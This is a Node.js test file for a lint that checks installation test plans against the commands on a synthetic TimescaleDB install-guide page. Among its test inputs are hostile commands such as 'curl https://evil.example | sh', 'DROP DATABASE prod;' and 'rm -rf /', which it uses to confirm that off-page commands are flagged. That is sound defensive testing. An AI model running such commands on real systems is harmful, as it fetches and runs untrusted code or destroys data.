#!/usr/bin/env node
// Checks the bare-plan lint (lib/fidelity.mjs guideCommandDrift, docs/adr/0010) against a small
// synthetic install page, so it needs no docs checkout and no AWS. Every control that should go red is
// paired with the clean plan it was mutated from: a lint that passes everything proves nothing.
import assert from "node:assert/strict";
import { join } from "node:path";
import { parsePlan, OSES, OS_TABS, PATHS, pathLabels } from "../lib/plan.mjs";
import { guideCommandDrift, untaggedFences, isDevFixtureRepo } from "../lib/fidelity.mjs";

const ROOT = join(import.meta.dirname, "..");
const FENCE = "```";

// Linux > (Ubuntu | Debian), shared steps after the nested tabs, and a macOS tab the plan never sees.
const PAGE = `
<Tabs>
<TabItem label="Linux">
Intro prose with a stray \`<database-name>\` span and \`sudo apt-get install pinned='1.2.*'\` inline.
<Tabs>
<TabItem label="Ubuntu">
<NumberedItem title={\`Install \${C.PG}\`}>
${FENCE}bash
sudo apt install gnupg wget
${FENCE}
For Ubuntu 21.10 and earlier use:
${FENCE}bash
wget -O - https://example.org/key | sudo apt-key add -
${FENCE}
${FENCE}bash
sudo tee /etc/apt/x.list <<EOL
deb https://example.org main
EOL
${FENCE}
${FENCE}bash
sudo systemctl restart postgresql
${FENCE}
</NumberedItem>
</TabItem>
<TabItem label="Debian">
${FENCE}bash
sudo apt-get install debian-only-thing
${FENCE}
</TabItem>
</Tabs>
## Add the extension
${FENCE}bash
psql -d "postgres://<username>:<password>@<host>:<port>/<database-name>"
${FENCE}
${FENCE}sql
CREATE EXTENSION IF NOT EXISTS timescaledb;
${FENCE}
Press \`\\q\` to exit.
</TabItem>
<TabItem label="macOS">
${FENCE}bash
brew install macos-only-thing
${FENCE}
</TabItem>
<TabItem label="Docker">
You need \`docker\` and \`psql\`.
<Tabs>
<TabItem label="TimescaleDB-HA">
${FENCE}bash
docker pull timescale/timescaledb-ha:pg18
${FENCE}
${FENCE}bash
docker run -d --name timescaledb -p 5432:5432 -e POSTGRES_PASSWORD=password timescale/timescaledb-ha:pg18
${FENCE}
${FENCE}bash
psql -d "postgres://postgres:password@127.0.0.1:5432/postgres"
${FENCE}
${FENCE}sql
\\dx
${FENCE}
## More Docker options
${FENCE}bash
docker run -d --name timescaledb -p 127.0.0.1:5432:5432 -e POSTGRES_PASSWORD=password timescale/timescaledb-ha:pg18
${FENCE}
</TabItem>
<TabItem label="TimescaleDB light">
${FENCE}bash
docker pull timescale/timescaledb:latest-pg18
${FENCE}
</TabItem>
</Tabs>
</TabItem>
<TabItem label="Kubernetes">
${FENCE}bash
kubectl create namespace tigerdata
${FENCE}
</TabItem>
</Tabs>
`;

// One entry per step. A multi-line command is `run command:` with its body indented under it, the
// way the dev fixtures write a heredoc.
const CLEAN = [
  "run command: `sudo apt install gnupg wget`",
  "answer `Do you want to continue? [Y/n]` with `Y`",
  "skip `wget -O - https://example.org/key | sudo apt-key add -`: Ubuntu 21.10 and earlier only",
  "run command:\n   `sudo tee /etc/apt/x.list <<EOL\n   deb https://example.org main\n   EOL`",
  "run command: `sudo systemctl restart postgresql`",
  'run command: `psql -d "postgres://postgres:<PASSWORD>@localhost:5432/postgres"`',
  "answer `postgres=#` with `CREATE EXTENSION IF NOT EXISTS timescaledb;`",
  "answer `postgres=#` with `\\q`",
];
const INSTALL = 0, SKIP = 2, RESTART = 4, PSQL = 5;

const planOf = (steps, os = "ubuntu") =>
  parsePlan(`${PAGE}\n<TestPlan>\ntarget: self-hosted\nmachine: bare\nos: ${os}\n${steps.map((l, i) => `${i + 1}. ${l}`).join("\n")}\n</TestPlan>`).plans[0];
const drift = (steps, os) => guideCommandDrift(PAGE, planOf(steps, os));
const kinds = (found) => found.map((f) => f.kind).sort();
const without = (i) => CLEAN.filter((_, k) => k !== i);

// A bare plan that names its reader's path with `path:` (docs/adr/0011). `os:` is the box, and stays Ubuntu.
const pathPlanOf = (steps, path, os = "ubuntu") =>
  parsePlan(`${PAGE}\n<TestPlan>\ntarget: self-hosted\nmachine: bare\nos: ${os}\n${path ? `path: ${path}\n` : ""}${steps.map((l, i) => `${i + 1}. ${l}`).join("\n")}\n</TestPlan>`).plans[0];
const DOCKER = [
  "run command: `docker pull timescale/timescaledb-ha:pg18`",
  "run command: `docker run -d --name timescaledb -p 5432:5432 -e POSTGRES_PASSWORD=password timescale/timescaledb-ha:pg18`",
  'run command: `psql -d "postgres://postgres:password@127.0.0.1:5432/postgres"`',
  "answer `postgres=#` with `\\dx`",
  "skip `docker run -d --name timescaledb -p 127.0.0.1:5432:5432 -e POSTGRES_PASSWORD=password timescale/timescaledb-ha:pg18`: the alternative to step 2, same container name",
];
const dockerDrift = (steps, path = "docker-ha", mdx = PAGE) => guideCommandDrift(mdx, pathPlanOf(steps, path));

let failed = 0;
const check = async (name, fn) => {
  try { await fn(); console.log(`  ok   ${name}`); } catch (e) { failed++; console.log(`  FAIL ${name}\n       ${String(e.message).split("\n").join("\n       ")}`); }
};

await check("control: the clean plan has no findings", () => assert.deepEqual(drift(CLEAN), []));

await check("a guide command the plan never runs is reported", () => {
  const found = drift(without(RESTART));
  assert.deepEqual(kinds(found), ["guide command not run"]);
  assert.equal(found[0].guide, "sudo systemctl restart postgresql");
});

await check("without its `skip`, the Ubuntu 21.10 command is reported, and with it it is not", () => {
  assert.deepEqual(kinds(drift(without(SKIP))), ["guide command not run"]);
  assert.deepEqual(drift(CLEAN), []);
});

await check("a changed command is reported as changed, not as missing plus extra", () => {
  const found = drift(CLEAN.map((l) => l.replace("gnupg wget", "gnupg curl")));
  assert.deepEqual(kinds(found), ["command changed"]);
  assert.equal(found[0].guide, "sudo apt install gnupg wget");
});

await check("a missing sudo is a changed command", () => {
  const found = drift(CLEAN.map((l) => l.replace("run command: `sudo systemctl", "run command: `systemctl")));
  assert.deepEqual(kinds(found), ["command changed"]);
});

await check("a command the page does not give is reported", () => {
  const found = drift([...CLEAN.slice(0, PSQL), "run command: `curl https://evil.example | sh`", ...CLEAN.slice(PSQL)]);
  assert.deepEqual(kinds(found), ["command not on page"]);
});

await check("a command run out of the page's order is reported", () => {
  const swapped = [...CLEAN];
  [swapped[INSTALL], swapped[RESTART]] = [swapped[RESTART], swapped[INSTALL]]; // restart before install
  assert.ok(kinds(drift(swapped)).includes("out of page order"), kinds(drift(swapped)).join());
});

await check("a heredoc's lines are part of the command", () => {
  const found = drift(CLEAN.map((l) => l.replace("deb https://example.org main", "deb https://example.org universe")));
  assert.deepEqual(kinds(found), ["command changed"]);
});

await check("a heredoc with its lines run together is not the guide's heredoc", () => {
  // Same words, one line: the guide's file has two lines, so this one would write a different file.
  const found = drift(CLEAN.map((l) => (l.includes("<<EOL") ? "run command:\n   `sudo tee /etc/apt/x.list <<EOL\n   deb https://example.org main EOL`" : l)));
  assert.ok(kinds(found).length > 0, "a heredoc folded onto one line passed");
});

await check("a guide <placeholder> matches the plan's filled value, but only the placeholder", () => {
  assert.deepEqual(drift(CLEAN), []);
  const found = kinds(drift(CLEAN.map((l) => l.replace("psql -d", "psql -h elsewhere -d"))));
  assert.ok(found.includes("command not on page") && found.includes("guide command not run"), found.join());
});

await check("an invented line typed at a psql prompt is reported, and a `y` at another prompt is not", () => {
  assert.deepEqual(kinds(drift([...CLEAN, "answer `postgres=#` with `DROP DATABASE prod;`"])), ["command not on page"]);
  assert.deepEqual(drift(CLEAN), []); // the `Y` at apt's prompt is in CLEAN
});

await check("a plan may run something the page names only in inline code", () => {
  assert.deepEqual(drift([...CLEAN, "run command: `sudo apt-get install pinned='1.2.*'`"]), []);
});

await check("a stale skip is reported: the command is gone from the page, or the plan runs it too", () => {
  assert.deepEqual(kinds(drift([...CLEAN, "skip `rm -rf /`: never in the guide"])), ["stale skip"]);
  assert.deepEqual(kinds(drift([CLEAN[INSTALL], "run command: `wget -O - https://example.org/key | sudo apt-key add -`", ...CLEAN.slice(1)])), ["stale skip"]);
});

await check("scope: another distro's command is not on the Ubuntu reader's path, and is not missing from it", () => {
  assert.deepEqual(kinds(drift([...CLEAN, "run command: `sudo apt-get install debian-only-thing`"])), ["command not on page"]);
  assert.ok(!drift(CLEAN).some((f) => /debian-only|macos-only/.test(f.guide || "")));
});

await check("scope: the same page checks a Debian plan against the Debian tab", () => {
  const debian = ["run command: `sudo apt-get install debian-only-thing`", ...CLEAN.slice(PSQL)];
  assert.deepEqual(drift(debian, "debian"), []);
});

await check("a tab the page no longer has is an error, not a pass", () => {
  const renamed = PAGE.replace('label="Ubuntu"', 'label="Ubuntu LTS"');
  const found = guideCommandDrift(renamed, planOf(CLEAN));
  assert.deepEqual(found, [{ kind: "tab not on page", label: "Ubuntu" }]);
});

await check("`skip` outside a bare plan is a parse error", () => {
  const p = parsePlan("<TestPlan>\ntarget: self-hosted\n1. skip `x`: why\n</TestPlan>");
  assert.match(p.errors[0]?.detail || "", /machine: bare/);
});

await check("every distro the tool provisions names its tab", () => {
  assert.deepEqual(OSES.filter((o) => !OS_TABS[o]), []);
});

await check("only a DOCS_REPO inside dev-fixtures is fixture mode", () => {
  assert.equal(isDevFixtureRepo(join(ROOT, "dev-fixtures", "docs-repo")), true);
  assert.equal(isDevFixtureRepo(join(ROOT, "dev-fixtures-not")), false);
  assert.equal(isDevFixtureRepo("/Users/someone/Tiger-Data-Docs"), false);
});

// --- path: (docs/adr/0011)
await check("control: a docker-ha plan on the Docker tab has no findings", () => assert.deepEqual(dockerDrift(DOCKER), []));

await check("the same commands without `path:` are checked against Linux > Ubuntu, and are not on it", () => {
  const found = kinds(dockerDrift(DOCKER, null));
  assert.ok(found.includes("command not on page") && found.includes("guide command not run"), found.join());
});

await check("a Linux-tab command is not on the Docker reader's path", () =>
  assert.deepEqual(kinds(dockerDrift([...DOCKER, "run command: `sudo apt install gnupg wget`"])), ["command not on page"]));

await check("the HA path is not the light path: each sub-tab is checked on its own", () => {
  assert.ok(kinds(dockerDrift(DOCKER, "docker-light")).includes("command not on page"));
  assert.deepEqual(dockerDrift(["run command: `docker pull timescale/timescaledb:latest-pg18`"], "docker-light"), []);
  const light = kinds(dockerDrift(["run command: `docker pull timescale/timescaledb:latest-pg18`"], "docker-ha"));
  assert.ok(light.includes("command changed"), light.join()); // a near-miss of the HA pull, so changed, not missing plus extra
});

await check("without its `skip`, the 127.0.0.1 variant is a guide command not run", () => {
  const found = dockerDrift(DOCKER.slice(0, 4));
  assert.deepEqual(kinds(found), ["guide command not run"]);
  assert.match(found[0].guide, /127\.0\.0\.1:5432:5432/);
});

await check("scope: adding Docker and Kubernetes tabs to the page changes nothing on the Ubuntu path", () => {
  const found = guideCommandDrift(PAGE, planOf(CLEAN));
  assert.deepEqual(found, []);
  assert.ok(!drift(CLEAN).some((f) => /docker|kubectl/.test(f.guide || f.plan || "")));
});

await check("a sub-tab or a tab the page no longer has is an error, not a pass", () => {
  assert.deepEqual(dockerDrift(DOCKER, "docker-ha", PAGE.replace('label="TimescaleDB-HA"', 'label="HA"')), [{ kind: "tab not on page", label: "TimescaleDB-HA" }]);
  assert.deepEqual(dockerDrift(DOCKER, "docker-ha", PAGE.replace('label="Docker"', 'label="Containers"')), [{ kind: "tab not on page", label: "Docker" }]);
});

await check("`path:` is a parse error without a bare box, with an unknown key, twice, or after step 1", () => {
  const detail = (hdr, tail = "1. run command: `true`") => parsePlan(`<TestPlan>\n${hdr}\n${tail}\n</TestPlan>`).plans[0].errors.map((e) => e.detail).join(" | ");
  assert.match(detail("target: self-hosted\npath: docker-ha"), /machine: bare/);
  assert.match(detail("target: self-hosted\nmachine: bare\nos: ubuntu\npath: docker-hq"), /not a reader's path.*docker-ha/);
  assert.match(detail("target: self-hosted\nmachine: bare\nos: ubuntu\npath: docker-ha\npath: kubernetes"), /more than one `path:`/);
  assert.match(detail("target: self-hosted\nmachine: bare\nos: ubuntu", "1. run command: `true`\npath: docker-ha"), /before step 1/);
  assert.equal(detail("target: self-hosted\nmachine: bare\nos: ubuntu\npath: docker-ha"), "");
});

await check("a Docker block and a distro block can share a distro; two Docker blocks cannot", () => {
  const blk = (extra) => `<TestPlan>\ntarget: self-hosted\nmachine: bare\nos: ubuntu\n${extra}1. run command: \`true\`\n</TestPlan>`;
  assert.deepEqual(parsePlan([blk(""), blk("path: docker-ha\n")].join("\n")).errors, []);
  assert.match(parsePlan([blk("path: docker-ha\n"), blk("path: docker-ha\n")].join("\n")).errors[0]?.detail || "", /already covers/);
  assert.match(parsePlan([blk(""), blk("")].join("\n")).errors[0]?.detail || "", /already covers/);
});

await check("every path names labels, and a distro's own path is Linux then its tab", () => {
  for (const [k, v] of Object.entries(PATHS)) assert.ok(Array.isArray(v) && v.length && v.every((x) => typeof x === "string" && x), k);
  assert.deepEqual(pathLabels({ os: "ubuntu" }), ["Linux", "Ubuntu"]);
  assert.deepEqual(pathLabels({ os: "ubuntu", path: "docker-ha" }), ["Docker", "TimescaleDB-HA"]);
  assert.equal(pathLabels({ os: null, path: null }), null);
});

await check("a guide placeholder that is a path, like Docker's `</a/local/data/folder>`, matches the plan's filled path and nothing else", () => {
  const page = `<Tabs>\n<TabItem label="Linux">\n<Tabs>\n<TabItem label="Ubuntu">\n${FENCE}bash\ndocker run -v </a/local/data/folder>:/pgdata img\n${FENCE}\n</TabItem>\n</Tabs>\n</TabItem>\n</Tabs>\n`;
  const ubuntu = (cmd) => guideCommandDrift(page, parsePlan(`${page}\n<TestPlan>\ntarget: self-hosted\nmachine: bare\nos: ubuntu\n1. run command: \`${cmd}\`\n</TestPlan>`).plans[0]);
  assert.deepEqual(ubuntu("docker run -v /home/ubuntu/pgdata:/pgdata img"), []);
  assert.ok(ubuntu("docker run -v /home/ubuntu/pgdata:/elsewhere img").length > 0, "a different command passed");
  assert.ok(ubuntu("docker run img").length > 0, "a command with no volume passed");
});

// --- untagged fences (docs/adr/0011)
// The real Docker guide gives `docker pull` and the main `docker run` in fences with no language tag.
const UPAGE = `<Tabs>\n<TabItem label="Linux">\n<Tabs>\n<TabItem label="Ubuntu">\n${FENCE}bash\nsudo apt install x\n${FENCE}\n${FENCE}\ndocker pull img:1\n${FENCE}\nYou see:\n${FENCE}\n Name | Version\n------+--------\n plpgsql | 1.0\n${FENCE}\n</TabItem>\n</Tabs>\n</TabItem>\n</Tabs>\n`;
const upage = (...steps) => parsePlan(`${UPAGE}\n<TestPlan>\ntarget: self-hosted\nmachine: bare\nos: ubuntu\n${steps.map((l, i) => `${i + 1}. ${l}`).join("\n")}\n</TestPlan>`).plans[0];
const APT = "run command: `sudo apt install x`";
const PULL = "run command: `docker pull img:1`";

await check("an untagged fence that looks like a command is listed, and sample output in one is not", () => {
  const plan = upage(APT);
  assert.deepEqual(guideCommandDrift(UPAGE, plan), []); // not required of a plan
  assert.deepEqual(untaggedFences(UPAGE, plan), [{ guide: "docker pull img:1" }]);
});

await check("a plan that runs a command from an untagged fence gets the specific finding, not `not on page`", () => {
  assert.deepEqual(kinds(guideCommandDrift(UPAGE, upage(APT, PULL))), ["command in an untagged fence"]);
  assert.deepEqual(untaggedFences(UPAGE, upage(APT, PULL)), []); // already a finding, not also an advisory
  // control: a command no fence gives is still "not on page"
  assert.deepEqual(kinds(guideCommandDrift(UPAGE, upage(APT, "run command: `docker pull other:2`"))), ["command not on page"]);
});

await check("a `skip` of an untagged command is not stale, and silences the advisory", () => {
  const plan = upage(APT, "skip `docker pull img:1`: the guide's alternative");
  assert.deepEqual(guideCommandDrift(UPAGE, plan), []);
  assert.deepEqual(untaggedFences(UPAGE, plan), []);
  // control: a skip of a command no fence gives is still stale
  assert.deepEqual(kinds(guideCommandDrift(UPAGE, upage(APT, "skip `docker pull other:2`: nope"))), ["stale skip"]);
});

await check("tagging the fence `bash` makes it an ordinary guide command", () => {
  const tagged = UPAGE.replace(`${FENCE}\ndocker pull img:1`, `${FENCE}bash\ndocker pull img:1`);
  assert.deepEqual(untaggedFences(tagged, upage(APT, PULL)), []);
  assert.deepEqual(guideCommandDrift(tagged, upage(APT, PULL)), []);
  assert.deepEqual(kinds(guideCommandDrift(tagged, upage(APT))), ["guide command not run"]);
});

console.log(failed ? `\n${failed} check(s) failed` : "\nall checks passed");
process.exit(failed ? 1 : 0);
